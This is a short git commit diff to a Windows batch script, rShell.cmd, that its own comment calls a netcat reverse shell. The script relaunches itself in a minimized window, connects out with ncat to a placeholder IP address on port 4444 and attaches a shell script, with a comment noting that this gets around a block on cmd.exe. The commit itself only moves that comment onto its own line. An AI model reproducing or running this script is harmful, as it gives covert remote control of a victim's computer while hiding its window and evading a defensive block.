228c4af2e0f65f6003bd2222d2d510b3fe1f4e13
Aiden G <orca950@gmail.com>
2017-05-24 18:40:26 -0500

    bug fixes

--- rShell.cmd
+++ rShell.cmd
@@ -1,5 +1,6 @@
 @ECHO OFF
 rem reverse shell using netcat
 if not DEFINED IS_MINIMIZED set IS_MINIMIZED=1 && start "" /min "%~dpnx0" %* && exit
-ncat.exe -nv "ipaddress" 4444 -e rekt.cmd rem uses rekt.cmd incase cmd.exe is blocked
+ncat.exe -nv "ipaddress" 4444 -e rekt.cmd 
+rem uses rekt.cmd incase cmd.exe is blocked
 exit
